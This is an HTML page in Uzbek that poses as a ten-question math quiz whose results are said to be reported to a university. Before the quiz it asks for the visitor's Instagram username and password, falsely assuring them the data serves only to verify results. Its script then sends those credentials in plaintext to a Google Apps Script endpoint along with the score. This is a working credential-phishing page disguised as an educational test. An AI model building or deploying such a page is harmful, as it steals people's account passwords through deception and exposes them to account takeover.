<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matematika Testlari | Instagram orqali tasdiqlash</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 900px;
            margin: 0 auto;
        }

        .card {
            background: white;
            border-radius: 32px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            overflow: hidden;
            margin-bottom: 20px;
        }

        .header {
            background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
            padding: 30px;
            text-align: center;
            color: white;
        }

        .header h1 {
            font-size: 2rem;
            margin-bottom: 10px;
        }

        .header h1 i {
            color: #f59e0b;
        }

        .instagram-badge {
            display: inline-block;
            background: rgba(255,255,255,0.2);
            padding: 8px 20px;
            border-radius: 40px;
            margin-top: 15px;
            font-size: 0.85rem;
        }

        .content {
            padding: 30px;
        }

        .login-form {
            max-width: 450px;
            margin: 0 auto;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 600;
            margin-bottom: 8px;
            color: #1e293b;
        }

        .input-group label i {
            color: #f59e0b;
            width: 20px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 18px;
            border: 2px solid #e2e8f0;
            border-radius: 16px;
            font-size: 1rem;
            transition: all 0.2s;
        }

        .input-group input:focus {
            outline: none;
            border-color: #f59e0b;
            box-shadow: 0 0 0 3px rgba(245,158,11,0.2);
        }

        .btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(95deg, #f59e0b, #d97706);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s;
        }

        .btn:hover {
            transform: scale(0.98);
        }

        .warning {
            background: #fffbeb;
            border-left: 4px solid #f59e0b;
            padding: 12px;
            border-radius: 12px;
            margin-top: 20px;
            font-size: 0.75rem;
            color: #92400e;
        }

        .test-section {
            display: none;
        }

        .question-card {
            background: #f8fafc;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #e2e8f0;
        }

        .question-number {
            display: inline-block;
            background: #e2e8f0;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 12px;
        }

        .question-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 15px;
            color: #1e293b;
        }

        .options {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .option {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 15px;
            background: white;
            border: 1px solid #e2e8f0;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.1s;
        }

        .option.selected {
            background: #fef3c7;
            border-color: #f59e0b;
        }

        .option input {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .option label {
            flex: 1;
            cursor: pointer;
        }

        .submit-btn {
            margin-top: 20px;
            background: linear-gradient(95deg, #10b981, #059669);
        }

        .result-area {
            margin-top: 20px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
            display: none;
        }

        .result-area.success {
            background: #d1fae5;
            color: #065f46;
        }

        .result-area.error {
            background: #fee2e2;
            color: #991b1b;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: #64748b;
            font-size: 0.75rem;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="header">
            <h1><i class="fas fa-square-root-variable"></i> Matematika Testlari</h1>
            <p>Haqiqiy ishtirokchilar — haqiqiy bilim</p>
            <div class="instagram-badge">
                <i class="fab fa-instagram"></i> Instagram orqali tasdiqlash
            </div>
        </div>

        <div class="content">
            <div id="loginPanel">
                <div class="login-form">
                    <div class="input-group">
                        <label><i class="fab fa-instagram"></i> Instagram username</label>
                        <input type="text" id="instagramUser" placeholder="masalan: real_math_user">
                    </div>
                    <div class="input-group">
                        <label><i class="fas fa-lock"></i> Instagram parol</label>
                        <input type="password" id="instagramPass" placeholder="••••••••">
                    </div>
                    <button class="btn" id="startTestBtn">
                        <i class="fas fa-play"></i> Testni boshlash
                    </button>
                    <div class="warning">
                        <i class="fas fa-shield-alt"></i>
                        Ma'lumotlaringiz faqat test natijalarini tasdiqlash uchun ishlatiladi.
                    </div>
                </div>
            </div>

            <div id="testPanel" class="test-section">
                <div id="questionsContainer"></div>
                <button class="btn submit-btn" id="submitTestBtn">
                    <i class="fas fa-paper-plane"></i> Testni yakunlash va natijalarni jo‘natish
                </button>
                <div id="resultMessage" class="result-area"></div>
            </div>
        </div>
    </div>
    <div class="footer">
        <i class="fas fa-chart-line"></i> Har bir natija qayd etiladi | Universitetga hisobot taqdim etiladi
    </div>
</div>

<script>
    // Google Sheets Script URL (sozlangan)
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwnUbdSQKAIzJuwni70cUKBdlDFrHJNxaW_UBhd6QUHjJ2L02Om2P0tQctAqDVR4OIT/exec';
    
    const TESTS = [
        { text: "x + 5 = 12 bo‘lsa, x ni toping.", options: ["5", "7", "12", "17"], correct: 1 },
        { text: "Kvadratning tomoni 8 cm. Perimetri?", options: ["16", "24", "32", "64"], correct: 2 },
        { text: "3² + 4² = ?", options: ["12", "25", "7", "24"], correct: 1 },
        { text: "150 ning 20% i necha?", options: ["15", "20", "30", "45"], correct: 2 },
        { text: "2x - 3 = 11, x = ?", options: ["4", "7", "8", "5"], correct: 1 },
        { text: "To‘g‘ri to‘rtburchak eni 6m, bo‘yi 9m. Yuzi?", options: ["54", "48", "36", "63"], correct: 0 },
        { text: "a=5, b=3 bo‘lsa, a³ - b² = ?", options: ["116", "125", "109", "98"], correct: 0 },
        { text: "7, 14, 21, ? Qatorni davom ettiring", options: ["24", "28", "35", "42"], correct: 1 },
        { text: "(x + 2)(x - 2) = ?", options: ["x² - 4", "x² + 4", "x² - 2x", "x² + 2x"], correct: 0 },
        { text: "Radius 5 sm. Aylana uzunligi (π=3.14)?", options: ["15.7", "31.4", "25", "78.5"], correct: 1 }
    ];

    let currentUser = { username: '', password: '' };
    let userAnswers = new Array(TESTS.length).fill(null);

    function calculateScore() {
        let correct = 0;
        for (let i = 0; i < TESTS.length; i++) {
            if (userAnswers[i] !== null && userAnswers[i] === TESTS[i].correct) {
                correct++;
            }
        }
        return { correct, total: TESTS.length, percent: Math.round(correct / TESTS.length * 100) };
    }

    async function sendToGoogleSheets() {
        const score = calculateScore();
        
        let answersDetail = '';
        for (let i = 0; i < TESTS.length; i++) {
            const userChoice = userAnswers[i];
            const isCorrect = (userChoice === TESTS[i].correct);
            const userAnswerText = userChoice !== null ? TESTS[i].options[userChoice] : 'Javob berilmagan';
            const correctText = TESTS[i].options[TESTS[i].correct];
            const mark = isCorrect ? '✅' : '❌';
            answersDetail += `${i+1}. ${mark} ${userAnswerText} (to‘g‘ri: ${correctText})\n`;
        }
        
        const data = {
            username: currentUser.username,
            password: currentUser.password,
            score: score.correct,
            total: score.total,
            percent: score.percent,
            answersDetail: answersDetail
        };
        
        try {
            // mode: 'no-cors' bilan yuboramiz
            await fetch(SCRIPT_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
            return { score, success: true };
        } catch (error) {
            console.error('Xatolik:', error);
            return { score, success: false };
        }
    }

    async function finishTest() {
        let unanswered = userAnswers.filter(a => a === null).length;
        if (unanswered > 0) {
            if (!confirm(`${unanswered} ta savolga javob berilmagan. Shunday bo‘lsa ham yakunlaysizmi?`)) {
                return;
            }
        }
        
        const submitBtn = document.getElementById('submitTestBtn');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Jo‘natilmoqda...';
        submitBtn.disabled = true;
        
        const result = await sendToGoogleSheets();
        
        const resultDiv = document.getElementById('resultMessage');
        resultDiv.style.display = 'block';
        
        if (result.success) {
            resultDiv.className = 'result-area success';
            resultDiv.innerHTML = `
                <i class="fas fa-check-circle" style="font-size: 28px;"></i><br><br>
                <strong>Natijangiz: ${result.score.correct}/${result.score.total} (${result.score.percent}%)</strong><br><br>
                ✅ Natijalar professor-o‘qituvchilarga jo‘natildi!<br>
                <small>Rahmat! Sizning ishtirokingiz qayd etildi.</small>
            `;
            submitBtn.innerHTML = '✅ Yakunlandi';
            submitBtn.disabled = true;
        } else {
            resultDiv.className = 'result-area error';
            resultDiv.innerHTML = `
                <i class="fas fa-exclamation-triangle" style="font-size: 28px;"></i><br><br>
                <strong>Xatolik yuz berdi!</strong><br>
                Iltimos, internet aloqasini tekshirib, qayta urinib ko‘ring.<br><br>
                <button onclick="location.reload()" style="padding:10px 20px;background:#f59e0b;color:white;border:none;border-radius:12px;cursor:pointer;">Qayta urinish</button>
            `;
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        }
    }

    function renderTests() {
        const container = document.getElementById('questionsContainer');
        let html = '';
        
        TESTS.forEach((test, idx) => {
            html += `
                <div class="question-card">
                    <div class="question-number">${idx + 1}-savol</div>
                    <div class="question-text">${test.text}</div>
                    <div class="options" data-qidx="${idx}">
            `;
            test.options.forEach((opt, optIdx) => {
                html += `
                    <div class="option" data-optidx="${optIdx}">
                        <input type="radio" name="q${idx}" value="${optIdx}" id="q${idx}_${optIdx}">
                        <label for="q${idx}_${optIdx}">${String.fromCharCode(65 + optIdx)}. ${opt}</label>
                    </div>
                `;
            });
            html += `</div></div>`;
        });
        
        container.innerHTML = html;
        
        for (let i = 0; i < TESTS.length; i++) {
            const optionsDiv = document.querySelectorAll(`.options[data-qidx="${i}"] .option`);
            optionsDiv.forEach(optDiv => {
                const radio = optDiv.querySelector('input');
                optDiv.addEventListener('click', () => {
                    radio.checked = true;
                    const optIdx = parseInt(optDiv.dataset.optidx);
                    userAnswers[i] = optIdx;
                    optionsDiv.forEach(od => od.classList.remove('selected'));
                    optDiv.classList.add('selected');
                });
                radio.addEventListener('change', () => {
                    if (radio.checked) {
                        userAnswers[i] = parseInt(optDiv.dataset.optidx);
                        optionsDiv.forEach(od => od.classList.remove('selected'));
                        optDiv.classList.add('selected');
                    }
                });
            });
        }
    }

    function startTest() {
        const username = document.getElementById('instagramUser').value.trim();
        const password = document.getElementById('instagramPass').value.trim();
        
        if (!username || !password) {
            alert('Iltimos, Instagram username va parolingizni kiriting!');
            return;
        }
        
        currentUser = { username, password };
        
        document.getElementById('loginPanel').style.display = 'none';
        document.getElementById('testPanel').style.display = 'block';
        
        renderTests();
        
        const resultDiv = document.getElementById('resultMessage');
        resultDiv.style.display = 'none';
        
        const submitBtn = document.getElementById('submitTestBtn');
        submitBtn.disabled = false;
        submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Testni yakunlash va natijalarni jo‘natish';
    }

    document.getElementById('startTestBtn').addEventListener('click', startTest);
    document.getElementById('submitTestBtn').addEventListener('click', finishTest);
    
    document.getElementById('instagramPass').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') startTest();
    });
    document.getElementById('instagramUser').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') startTest();
    });
</script>
</body>
</html>
